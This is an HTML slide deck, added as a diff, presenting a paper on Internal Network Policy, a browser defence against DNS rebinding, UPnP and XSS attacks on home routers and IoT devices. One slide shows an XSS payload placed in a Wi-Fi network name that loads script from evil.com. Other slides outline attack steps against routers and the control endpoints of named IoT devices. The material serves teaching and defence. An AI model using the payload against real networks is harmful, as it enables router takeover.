@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport"
+              content="width=device-width, initial-scale=1.0">
+        <meta name="apple-mobile-web-app-capable"
+              content="yes">
+        <meta name="apple-mobile-web-app-status-bar-style"
+              content="black-translucent">
+        <meta name="author"
+              content="Hsiao-Te Hu">
+        <meta name="desciption"
+              content="Presentation for 2020/02/06 Group Meeting">
+
+        <title>Eradicating Attacks on the Internal Network with Internal Network Policy</title>
+
+        <link rel="stylesheet" href="../../../css/reset.css">
+        <link rel="stylesheet" href="../../../css/reveal.css">
+        <link rel="stylesheet" href="../../../css/theme/black.css">
+
+        <!-- Theme used for syntax highlighting of code -->
+        <link rel="stylesheet" href="../../../lib/css/monokai.css">
+
+        <!-- Printing and PDF exports -->
+        <script>
+            var link = document.createElement('link');
+            link.rel = 'stylesheet';
+            link.type = 'text/css';
+            link.href = window.location.search.match(/print-pdf/gi) ? '../../css/print/pdf.css' : '../../css/print/paper.css';
+            document.getElementsByTagName('head')[0].appendChild(link);
+        </script>
+
+        <style>
+            h2 {
+                text-transform: none !important;
+            }
+            h3 {
+                text-transform: none !important;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="reveal">
+            <div class="slides">
+                <section>
+                    <h2>
+                        Eradicating Attacks on the Internal Network with Internal Network Policy
+                    </h2>
+                    <p>
+                        Y. Afek, A. Bremler-Barr, A. Noy, arXiv:1910.00975, 2019
+                        Speaker: Hsiao-Te Hu
+                    </p>
+                </section>
+                <section>
+                    <section>
+                        <h2>Introduction</h2>
+                        <p>Traditional Internal Network Attack & Defence</p>
+                    </section>
+                    <section>
+                        <h2>Internal Network</h2>
+                        <p>A network that uses private IP address space.</p>
+                        <img src="img/internal-network.png" alt="">
+                    </section>
+                    <section data-markdown>
+                        <textarea data-template>
+                            ## Internal Network Attack
+                            ```html
+                            <!DOCTYPE html>
+                            <html>
+                              <head>
+                              </head>
+                              <body>
+                                <script >
+                                  Malicious code here
+                                </script>
+                              </body>
+                            </html>
+                            ```
+                        </textarea>
+                    </section>
+                    <section>
+                        <h2>Internal Network Defense</h2>
+                        <p>Same Origin Policy (SOP)</p>
+                        <ul>
+                            <li>An origin is defined as a combination of
+                                <span style="color: yellow;">URI scheme</span>,
+                                <span style="color: yellow;">host name</span>, and
+                                <span style="color: yellow;">port number</span>.</li>
+                            <li>A web browser permits scripts contained in one web page to access data in a second web
+                                page only if both web pages have the
+                                <span style="color: yellow;">same origin</span>.</li>
+                            <li>Otherwise, SOP prevents the scripts from
+                                <span style="color: yellow;">reading</span> the response.</li>
+                        </ul>
+                    </section>
+                    <section>
+                        <h2>SOP Example</h2>
+                        <p>http://domain-a.com/index.html</p>
+                        <table style="font-size: 28px">
+                            <thead>
+                                <tr>
+                                    <th>URL</th>
+                                    <th>Outcome</th>
+                                    <th>Reason</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>http://domain-a.com/layout.css</td>
+                                    <td>Same origin</td>
+                                    <td></td>
+                                </tr>
+                                <tr>
+                                    <td>http://domain-a.com/image.png</td>
+                                    <td>Same origin</td>
+                                    <td></td>
+                                </tr>
+                                <tr>
+                                    <td>https://domain-a.com/script.js</td>
+                                    <td>Failure</td>
+                                    <td>Different protocol</td>
+                                </tr>
+                                <tr>
+                                    <td>http://domain-a.com:8080/script.js</td>
+                                    <td>Failure</td>
+                                    <td>Different port</td>
+                                </tr>
+                                <tr>
+                                    <td>http://domain-b.com/script.js</td>
+                                    <td>Failure</td>
+                                    <td>Different host</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </section>
+                </section>
+                <section>
+                    <section>
+                        <h2>Related Work</h2>
+                        <p>Attacks on IoT behind NAT</p>
+                    </section>
+                    <section>
+                        <h2>Acar et al. attack on IoTs</h2>
+                        <p>DNS Rebinding, allow the attack to <b>extract information</b> from or <b>send commands</b> to the device.</p>
+                        <img src="img/attack0.png" alt="">
+                    </section>
+                    <section>
+                        <h2>Acar et al. attack on IoTs</h2>
+                        <ol>
+                            <li>The victim surfs to the attacker's website evil.com</li>
+                            <li>The malicious script repeatedly sends GET requests to
+                                http://evil.com/evil-test.</li>
+                            <li>Attacker changes the evil.com DNS record.</li>
+                            <li>DNS Rebinding is completed</li>
+                            <li>Local device is accessed by the attacker.</li>
+                        </ol>
+                    </section>
+                </section>
+                <section>
+                    <section>
+                        <h2>Three additional Attacks</h2>
+                        <p>Each circumventing SOP in a different way.</p>
+                    </section>
+                    <section>
+                        <h2>Attack I: Attacking home routers with DNS Rebinding & UPnP</h2>
+                        <p>The attacker can directly access the home network</p>
+                        <img src="img/attack1.png" alt="">
+                    </section>
+                    <section>
+                        <h2>Attack I Cont.</h2>
+                        <p>A router's UPnP server supports HTTP requests which contain commands, such as
+                            <span style="color: yellow;">add a port forwarding rule</span> or
+                            <span style="color: yellow;">changing the DNS server</span>.</p>
+                        <img src="img/port-forwarding.png" alt="">
+                    </section>
+                    <section>
+                        <h2>Attack II: Attacking internal devices without DNS Rebinding</h2>
+                        <p>The attacker can remotely control IoT by their
+                            <span style="color: yellow;">web management API</span> or exploit IoT vulnerabilities</p>
+                        <img src="img/attack2.png" alt="">
+                    </section>
+                    <section>
+                        <h2>Attack III: Attacking home routers through static HTML elements</h2>
+                        <img src="img/attack3.png" alt="">
+                    </section>
+                    <section>
+                        <h2>Attack III Cont.</h2>
+                        <ol style="font-size: 32px">
+                            <li>The attacker sets up an access point, with network name (SSID):
+                                <pre><code class="hljs html"><script src=http://evil.com/evil.js></script></code></pre></li>
+                            <li>The victim surfs to the attacker's controlled web-site, evil.com</li>
+                            <li>The malicious HTML identifies the victim's router</li>
+                            <li>The attacker makes a login request using an HTML form to the home router.</li>
+                            <li>The attacker's redirects the victim to the AP List panel page.</li>
+                            <li>The XSS is invoked</li>
+                        </ol>
+                        <img src="img/ap-list.jpeg" alt="">
+                    </section>
+                </section>
+                <section>
+                    <section>
+                        <h2>Internal Network Policy (INP)</h2>
+                        <p>Strong restrictions on web browser accesses to an internal network device
+                            from an external web page</p>
+                    </section>
+                    <section>
+                        <h2>INP Process</h2>
+                        <img src="img/inp-process.png" alt="">
+                        <blockquote style="font-size: 28px">A cross-network request is an HTTP request that is
+                            initiated by an external web page to an internal resource.</blockquote>
+                    </section>
+                    <section>
+                        <h2>INP preflight request / response</h2>
+                        <img src="img/inp-headers.png" alt="">
+                        <ul style="font-size: 32px">
+                            <li>X-INP-Source-Origin: http://domain-a.com/index.html</li>
+                            <li>X-INP-Source-IP: 1.2.3.4</li>
+                            <li>X-INP-Request-Method: GET</li>
+                            <li>X-INP-Source-Headers: </li>
+                        </ul>
+                    </section>
+                    <section data-markdown>
+                        <textarea data-template>
+                            ## INP Implementation
+                            * Implemented in the web browser
+                                * chromium
+                                * frequently updated
+                            * Backward compatible
+                                * INP and SOP are naturally integrated together
+                                * "no reponse" to the preflight request is considered as a deny response
+                        </textarea>
+                    </section>
+                </section>
+                <section>
+                    <section>
+                        <h2>Experminets</h2>
+                    </section>
+                    <section data-markdown>
+                        <textarea data-template>
+                            ## Attack I, III
+                            ![](img/test-results.png)
+                            * Attack I can be prevented by including an unique identifier (UUID) in the UPnP URL.
+                            * Attack III can be prevented by including input validation.
+                        </textarea>
+                    </section>
+                    <section data-markdown>
+                        <section data-template>
+                            ## Attack II
+                            * target IoT
+                                * Yamaha Network AV Receiver
+                                * Sony Smart TV
+                            * Web management API
+                                * POST http://xxx.xxx.xxx.xxx/YamahaRemoteControl/ctrl
+                                * POST http://xxx.xxx.xxx.xxx/sony/IRCC
+                            * Commands
+                                * Power Off, Volume Control, Display Control
+                        </section>
+                    </section>
+                    <section data-markdown>
+                        <section data-template>
+                            ## Testing INP
+                            * PoC source code
+                            * no noticeable overhead
+                                * extraction of the HTTP headers
+                                * string comparsion
+                        </section>
+                    </section>
+                </section>
+                <section data-markdown>
+                    <textarea data-template>
+                        ## Conclusion
+                        * INP 解決了 Internal Network Attack 使用瀏覽器作為中繼跳板的問題。
+                        * INP 尚有幾種無法防止的 Internal Network Attack
+                            * gaining physical access to the network.
+                            * exploit a vulnerability in software which communicates directly with the internet.
+                    </textarea>
+                </section>
+            </div>
+        </div>
+
+        <script src="../../../js/reveal.js"></script>
+
+        <script>
+            // More info https://github.com/hakimel/reveal.js#configuration
+            Reveal.initialize({
+                controls: true,
+                progress: true,
+                center: true,
+                hash: true,
+                transition: 'slide', // none/fade/slide/convex/concave/zoom
+
+                // More info https://github.com/hakimel/reveal.js#dependencies
+                dependencies: [
+                    { src: '../../../plugin/markdown/marked.js', condition: function() {
+                        return !!document.querySelector( '[data-markdown]' ); } },
+                    { src: '../../../plugin/markdown/markdown.js', condition: function() {
+                        return !!document.querySelector( '[data-markdown]' ); } },
+                    { src: '../../../plugin/highlight/highlight.js', async: true },
+                    { src: '../../../plugin/search/search.js', async: true },
+                    { src: '../../../plugin/zoom-js/zoom.js', async: true },
+                    { src: '../../../plugin/notes/notes.js', async: true }
+                ]
+            });
+        </script>
+    </body>
+</html>
